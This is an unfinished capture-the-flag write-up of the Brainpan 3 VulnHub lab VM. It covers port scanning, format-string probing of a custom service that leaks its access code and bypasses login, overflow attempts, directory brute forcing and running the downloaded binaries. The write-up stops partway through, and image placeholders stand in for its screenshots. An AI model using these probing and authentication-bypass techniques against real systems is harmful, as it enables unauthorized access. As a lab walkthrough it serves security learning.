#### Description: Writeup of Brainpan 3 VM in Vulnhub by the author superkojiman

##### Port Scanning All ports on the VM

```
# nmap -A -T4 -sV -PN -p- 172.16.16.140

Starting Nmap 6.40 ( http://nmap.org ) at 2016-05-25 12:16 IST

Nmap scan report for 172.16.16.140
Host is up (0.00022s latency).
Not shown: 65533 filtered ports
PORT     STATE  SERVICE    VERSION
1337/tcp open   waste?
1337/udp open|filtered menandmice-dns
8080/tcp closed http-proxy
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port1337-TCP:V=6.40%I=7%D=5/25%Time=57458C21%P=x86_64-pc-linux-gnu%r(NU
SF:LL,220,"\n\n\x20\x20__\x20\)\x20\x20\x20\x20_\x20\\\x20\x20\x20\x20\x20
SF:\x20\\\x20\x20\x20\x20_\x20_\|\x20\x20\x20\\\x20\x20\|\x20\x20\x20_\x20
SF:\\\x20\x20\x20\x20\\\x20\x20\x20\x20\x20\x20\\\x20\x20\|\x20\x20\x20\x2
SF:0\x20_\x20_\|\x20_\x20_\|\x20_\x20_\|\n\x20\x20__\x20\\\x20\x20\x20\|\x
SF:20\x20\x20\|\x20\x20\x20\x20_\x20\\\x20\x20\x20\x20\x20\|\x20\x20\x20\x
SF:20\x20\\\x20\|\x20\x20\|\x20\x20\x20\|\x20\x20_\x20\\\x20\x20\x20\x20\x
SF:20\x20\\\x20\|\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\|\x20\x20\
SF:x20\x20\|\x20\n\x20\x20\|\x20\x20\x20\|\x20\x20__\x20<\x20\x20\x20\x20_
SF:__\x20\\\x20\x20\x20\x20\|\x20\x20\x20\|\\\x20\x20\|\x20\x20___/\x20\x2
SF:0___\x20\\\x20\x20\x20\|\\\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|\x20\
SF:x20\x20\x20\|\x20\x20\x20\x20\|\x20\n\x20____/\x20\x20_\|\x20\\_\\\x20_
SF:/\x20\x20\x20\x20_\\\x20___\|\x20_\|\x20\\_\|\x20_\|\x20\x20\x20_/\x20\
SF:x20\x20\x20_\\\x20_\|\x20\\_\|\x20\x20\x20\x20\x20___\|\x20___\|\x20___
SF:\|\n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20by\x20superkojiman\n\n\n\n\nAUTHORIZED
SF:\x20PERSONNEL\x20ONLY\nPLEASE\x20ENTER\x20THE\x204-DIGIT\x20CODE\x20SHO
SF:WN\x20ON\x20YOUR\x20ACCESS\x20TOKEN\nA\x20NEW\x20CODE\x20WILL\x20BE\x20
SF:GENERATED\x20AFTER\x20THREE\x20INCORRECT\x20ATTEMPTS\n\nACCESS\x20CODE:
SF:\x20")%r(GenericLines,40E,"\n\n\x20\x20__\x20\)\x20\x20\x20\x20_\x20\\\
SF:x20\x20\x20\x20\x20\x20\\\x20\x20\x20\x20_\x20_\|\x20\x20\x20\\\x20\x20
SF:\|\x20\x20\x20_\x20\\\x20\x20\x20\x20\\\x20\x20\x20\x20\x20\x20\\\x20\x
SF:20\|\x20\x20\x20\x20\x20_\x20_\|\x20_\x20_\|\x20_\x20_\|\n\x20\x20__\x2
SF:0\\\x20\x20\x20\|\x20\x20\x20\|\x20\x20\x20\x20_\x20\\\x20\x20\x20\x20\
SF:x20\|\x20\x20\x20\x20\x20\\\x20\|\x20\x20\|\x20\x20\x20\|\x20\x20_\x20\
SF:\\x20\x20\x20\x20\x20\x20\\\x20\|\x20\x20\x20\x20\x20\x20\x20\|\x20\x20
SF:\x20\x20\|\x20\x20\x20\x20\|\x20\n\x20\x20\|\x20\x20\x20\|\x20\x20__\x2
SF:0<\x20\x20\x20\x20___\x20\\\x20\x20\x20\x20\|\x20\x20\x20\|\\\x20\x20\|
SF:\x20\x20___/\x20\x20___\x20\\\x20\x20\x20\|\\\x20\x20\|\x20\x20\x20\x20
SF:\x20\x20\x20\|\x20\x20\x20\x20\|\x20\x20\x20\x20\|\x20\n\x20____/\x20\x
SF:20_\|\x20\\_\\\x20_/\x20\x20\x20\x20_\\\x20___\|\x20_\|\x20\\_\|\x20_\|
SF:\x20\x20\x20_/\x20\x20\x20\x20_\\\x20_\|\x20\\_\|\x20\x20\x20\x20\x20__
SF:_\|\x20___\|\x20___\|\n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20by\x20superkojiman\
SF:n\n\n\n\nAUTHORIZED\x20PERSONNEL\x20ONLY\nPLEASE\x20ENTER\x20THE\x204-D
SF:IGIT\x20CODE\x20SHOWN\x20ON\x20YOUR\x20ACCESS\x20TOKEN\nA\x20NEW\x20COD
SF:E\x20WILL\x20BE\x20GENERATED\x20AFTER\x20THREE\x20INCORRECT\x20ATTEMPTS
SF:\n\nACCESS\x20CODE:\x20ERROR\x20#1:\x20INVALID\x20ACCESS\x20CODE:\x20\r
SF:\n\nACCESS\x20CODE\x20MUST\x20BE\x204\x20DIGITS\n\nFAILED\x20LOGIN\x20A
SF:TTEMPTS:\x201\n\nAUTHORIZED\x20PERSONNEL\x20ONLY\nPLEASE\x20ENTER\x20TH
SF:E\x204-DIGIT\x20CODE\x20SHOWN\x20ON\x20YOUR\x20ACCESS\x20TOKEN\nA\x20NE
SF:W\x20CODE\x20WILL\x20BE\x20GENERATED\x20AFTER\x20THREE\x20INCORRECT\x20
SF:ATTEMPTS\n\nACCESS\x20CODE:\x20ERROR\x20#1:\x20INVALID\x20ACCESS\x20COD
SF:E:\x20\r\n\nACCESS\x20CODE\x20MUST\x20BE\x204\x20DIGITS\n\nFAILED\x20LO
SF:GIN\x20ATTEMPTS:\x202\n\nAUTHORIZED\x20PERSONNE");
MAC Address: 00:0C:29:0C:D4:BD (VMware)
Aggressive OS guesses: Linux 3.0 - 3.9 (93%), Linux 2.6.26 - 2.6.35 (92%), Linux 2.6.23 - 2.6.38 (91%), Linux 2.6.32 - 2.6.39 (91%), Linux 2.6.37 (91%), Linux 2.6.32 (90%), Linux 2.6.22 (89%), Linux 2.6.32 - 3.9 (89%), Linux 2.6.35 (89%), Crestron XPanel control system (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 172.16.16.140

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 860.77 seconds
```

We found just one port open, which is 1337/tcp but we have no clue on what service is running there. Analysing NMAP output it shows many 201 codes, so it might be a HTTP server. Let's check very quickly.

```
# telnet 172.16.16.140 1337
Trying 172.16.16.140...
Connected to 172.16.16.140.
Escape character is '^]'.


  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | 
  |   |  __ <    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | 
 ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|

                                                            by superkojiman




AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: 
```

It appears to be some sort of FTP or TELNET daemon, asking for an "ACCESS CODE:". The message says it's waiting for a 4-DIGIT CODE. By saying DIGIT it could be a number, letter, symbols or a combination of both. 

Let's try with numbers first: 

```
AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: 1234
FAILED LOGIN ATTEMPTS: 1
```

OK, we have an error message but nothing more. Now let's try with 3 numbers and 1 letter.

```
AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: 123a
ERROR #1: INVALID ACCESS CODE: 123a

ACCESS CODE MUST BE 4 DIGITS

FAILED LOGIN ATTEMPTS: 1
```

Now we get a different message, "ERROR #1: INVALID ACCESS CODE: 123a" and also another information "ACCESS CODE MUST BE 4 DIGITS". Let's keep on now only with letters:

```
AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: abcd
ERROR #2: INVALID ACCESS CODE: abcd


ACCESS CODE MUST BE 4 DIGITS

FAILED LOGIN ATTEMPTS: 1
```

Exact same thing. My first thought by seeing these messages is trying a buffer overflow, but the problem is, if we do it, we won't have the software (binary) behind it to check for the BOF condition, and we could end up crashing the service. But, WHAT THE HELL, we are using a VM, so we can reset it when the hell we need.

So let me try some fuzzing with different format strings like "%x", "%d", "%s", etc:

First with "%s" which is used to read character strings from the process memory. 

```
# nc -v 172.16.16.140 1337
Connection to 172.16.16.140 1337 port [tcp/*] succeeded!


  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | 
  |   |  __ <    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | 
 ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|

                                                            by superkojiman




AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: %s.%s.%s.%s
ERROR #1: INVALID ACCESS CODE: thegrid ~ #
```

OK, it didn't work. We were thrown back to the prompt. Let's try now with "%x" which is used to read data from the stack. More specifically try to show the first 8 characters prefixed with zeros and also in lower case

```
AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: %08x 
ERROR #1: INVALID ACCESS CODE: bff616dc

ACCESS CODE MUST BE 4 DIGITS
```

Now we've got another error, showing us the code "bff616dc". Let's try one more time but with 4 digits.

```
AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: %08x.%08x.%08x.%08x
ERROR #1: INVALID ACCESS CODE: bff616dc.00000000.00000a68.bff616dc

ACCESS CODE MUST BE 4 DIGITS
```

OK. the first and last set of numbers are the same, "bff616dc", but we have zeros in the second set and "00000a68" on the second.

Let's now try with format string for decimals and see what we've got: 

```
AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: %d.%d.%d.%d.%d
ERROR #1: INVALID ACCESS CODE: -1077554900.0.7626.-1077554900.0

ACCESS CODE MUST BE 4 DIGITS
```

Now we have something very different, the number 7626 in the middle of the other repeating numbers. This could as well be our password. Let's try that as the code:

```
ACCESS CODE: 7626

--------------------------------------------------------------
SESSION: ID-9589
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND: 
```

Hurray, we are in. We are presented with more options than we had before.

##### Option: "4  - SHELL"

There seems to be a very interesting option called "4  - Shell". Let's try that:

```
ENTER COMMAND: 4
SELECTED: 4
reynard@brainpan3 $ id
uid=1000(reynard) gid=1000(reynard)

```

There we go, in again, but now with a shell. The software is working with user "reynard" permissions as stated by our command "id".

Let's dig a little bit and try to find more information, hopefully a way to root it.

The first think I can see is that we are not allowed many commands, probably we are in a chroot/jail shell.

A quick 'ls' command shows us the following information: 

```
reynard@brainpan3 $ ls
total 0
-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 let
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down
```

Something is looking promissing BUT, not that promissing. Let's "cat" the .flag file:

```
reynard@brainpan3 $ cat .flag
(ಠ_ಠ)
```

YUP !!! Just as I imagined, just a little joke :), besides the "never gonna give you up never gonna let you down" which I remember to be the refrain of a very famous song by Ricky Astley. Oh boy, how I miss the 80's.

OK. I've spent some time checking for useful commands but it seems we have only some commands like "ls", "id", "whoami", "cat .flag" and "exit" to use. So let's out some directories, just to make sure :)

```
reynard@brainpan3 $ vim
vim: command not found
reynard@brainpan3 $ echo *
echo *: command not found
reynard@brainpan3 $ ls .
ls .: command not found
reynard@brainpan3 $ ls ..
ls ..: command not found
reynard@brainpan3 $ alias
alias: command not found
reynard@brainpan3 $ printf
printf: command not found
reynard@brainpan3 $ print
print: command not found
reynard@brainpan3 $ set
set: command not found
reynard@brainpan3 $ env
env: command not found
reynard@brainpan3 $ cat /etc
cat /etc: command not found
reynard@brainpan3 $ rm down
rm down: command not found
reynard@brainpan3 $ /bin/bash
/bin/bash: command not found
reynard@brainpan3 $ /bin/sh
/bin/sh: command not found
```
OK, no luck at all. 

We can try some CHROOT/Jail Shell Escape techniques and check if we can go out of it, but after checking out the commands we have, i ended concluding it is useless.

So let's try to overflow the shell input with Characteres: 

```
reynard@brainpan3 $ ASD;LKJASD;FLJKADSFL;KJSD;LFKJADSFOIASDOFIUASDFKJASDLFKJSADLFJASDFJASJDFLJSALDLKSADJFLKSDLKSALDFJLAKSDFLKSJDFKJASDFJLKSADJFKADSLFKJASLDFJAS;DLKFJASLDKFJADSKLFJKJASF
```

Another dead end. We are thrown back to the menu. Couldn't find any usefull command in shell. If there is a way of getting root from the shell, i couldn't find out. So Let's move to another place.


##### Option: "1  - CREATE REPORT"

OK, let's try the other option: 

```
--------------------------------------------------------------
SESSION: ID-9589
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND: 1
SELECTED: 1
REPORT MODE IS DISABLED IN THIS BUILD
```

Tried to click again and the same thing happened


##### Option: "2  - VIEW CODE REPOSITORY"

OK, let's choose this option: 

```
--------------------------------------------------------------
SESSION: ID-9589
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND: 2
SELECTED: 2

CODE REPOSITORY IS NOW AVAILABLE
```

After clicking for the second time the same option we've got a slightly different message: 

```
CODE REPOSITORY IS ALREADY ENABLED
```

Again. Nothing really interesting there


##### Option: "3  - UPDATE SESSION NAME"

OK, let's choose this option:

```
--------------------------------------------------------------
SESSION: ID-9589
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND: 3
SELECTED: 3
ENTER NEW SESSION NAME: 
```

OK, function 3 asks for a input. After trying some random things like numbers, names, NO GO again. So let's try again to BOF the option: 

```
ENTER NEW SESSION NAME: AAAAAAAAAAAAABBBBBBBBBBBBBBCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHIIIIIIIIIIIIIIIIIIAAAAAAAAAAAAABBBBBBBBBBBBBBCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHIIIIIIIIIIIIIIIIIIAAAAAAAAAAAAABBBBBBBBBBBBBBCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHIIIIIIIIIIIIIIIIII

YOU ARE NO LONGER AUTHENTICATED.
PLEASE RE-AUTHENTICATE.

AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE: 

                      /´¯/) 
                    ,/¯  / 
                   /    / 
             /´¯/'   '/´¯¯`·¸ 
          /'/   /    /       /¨¯\ 
        ('(   ´   ´     ¯~/'   ') 
         \                 '     / 
          ''   \           _.·´ 
            \              ( 
              \__-_-____-___\   



--------------------------------------------------------------
SESSION: ID-6897
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND: 
```

OK, this time, the administrator is a little bit pissed with me appearently LOL.

Let's try to pass a series of decimal format strings: 

```
--------------------------------------------------------------
SESSION: 
D-689
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND: 3
SELECTED: 3
ENTER NEW SESSION NAME: %d.%d.%d.%d.%d.%d.%d.%d
--------------------------------------------------------------
SESSION: -1076080660.260.623797285.1680158308.778315054.623797285.1680158308.174335278
ue
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND: 
```

OK, nothing again. Running out of options.


##### Port Scanning Again

I just remembered that whem we used the option "2  - VIEW CODE REPOSITORY" it said the repository was enabled. So I thought of scanning the server again: 

```
PORT     STATE SERVICE VERSION
1337/tcp open  waste?
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.6)
|_http-methods: No Allow or Public header in OPTIONS response (status code 501)
| http-robots.txt: 1 disallowed entry 
|_/bp3_repo
|_http-title: Brainpan III
```

Ok !!! Now there is one more service UP in port 8080, and it seems to be a HTTP server. Nmap could also check for a disallowed entry in robots.txt called "/bp3_repo".

Let's just fire up the browser and see what we can get

##### Service HTTP 8080/TCP Port

We found a page with some cool content, that goes for miles and miles. Which is just really a big picture.

<TAG DE IMAGEM AQUI>

Code inspection on that page showed nothing special: 

```
<html>
<head>
<title>Brainpan III</title>
</head>
<body>
<center>
<!-- inforgraphic by Hotspot Shield VPN -->
<!-- http://www.dailyinfographic.com/where-youll-get-hacked-infographic -->
<img src="infographic.png"/>
</center>
</body>
</html>

```

So, it's time to go to /bp3_repo. That's what we found there. Just a animated gif called "mario.gif"

<TAG PICUTRE HTTP-2-MARIO.PNG>

Code analisis showed nothing again: 

```
<html>
<head>
<title>Brainpan III</title>
</head>
<body>
<center>
<img src="mario.gif"/>
<br/>
<pre>Let's-a-go!</pre>
</center>
</body>
</html>
```

##### Brute forcing Directories

OK, with too much time spent already and nothing really useful to work with, i've tried to bruteforce the webserver directories and check what I could get. I used dirb for this one from my Kali Box: 

```
root@kali:~# dirb http://172.16.16.140:8080

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May 25 11:23:19 2016
URL_BASE: http://172.16.16.140:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.16.140:8080/ ----
+ http://172.16.16.140:8080/index.html (CODE:200|SIZE:241)                                                                                                                                                                            
+ http://172.16.16.140:8080/repo (CODE:301|SIZE:0)                                                                                                                                                                                    
+ http://172.16.16.140:8080/robots.txt (CODE:200|SIZE:34)                                                                                                                                                                             
                                                                                                                                                                                                                                      
-----------------
END_TIME: Wed May 25 11:23:24 2016
DOWNLOADED: 4612 - FOUND: 3

```

Aha, at least something new. We can see that we have the previous files we already new, and also one directory called "/repo". Let's give it a try in the browser:

<TAG PICTURE HTTP-3-REPO-DIRECTORY>

Now we have found 5 files. Inspecting the content of the files, I've got

From "README.txt":   
"Well you've made it this far. No turning back now."

From "how-to-pwn-brainpan.jpg": 

<TAG PICTURE HTTP-4-how-to-pwn-brainpan>

Well, it doesn't hurt to try it right ? As I expected, again another joke. HAHAHA

Files "bofh", "report" and "shell" appear to be BIN files, so I've downloaded them to my Kali Box and began some forensics.


##### File: "shell"

Let's run the file in our machine and check what we can get from there: 

```
# ./shell 
            ___
        .-"; ! ;"-.
      .'!  : | :  !`.
     /\  ! : ! : !  /\
    /\ |  ! :|: !  | /\
   (  \ \ ; :!: ; / /  )
  ( `. \ | !:|:! | / .' )
  (`. \ \ \!:|:!/ / / .')
   \ `.`.\ |!|! |/,'.' /
    `._`.\\\!!!// .'_.'
       `.`.\\|//.'.'
        |`._`n'_.'|
        "----^----"

     here's your shell
```

##### File: "report"

Now the other file: 

```
# ./report 
./report <report> [0|1]

# ./report test 1
               ____
           .-'&    '-.
          / __    __  \
         :-(__)--(__)--;
        (      (_       )
         :             ;
          \    __     /
           `-._____.-'
             /`"""`\
            /    ,  \
           /|/\/\/\ _\
          (_|/\/\/\\__)
            |_______|
           __)_ |_ (__
          (_____|_____)

       YOU'RE IN THE MATRIX
           CHARLIE BROWN

```

The same thing happens with option "0".

##### File: "bofh"

Now for the last file: 

```
# ./bofh 
Usage ./bofh filename
Description: An exercise in futility.

# ./bofh test.txt 
Couldn't open wo+ft�CJ

```

Any kind of file could be opened by "./bofh". So let's inspect its strings and see what info can we get.



<TAG> ... to be continued
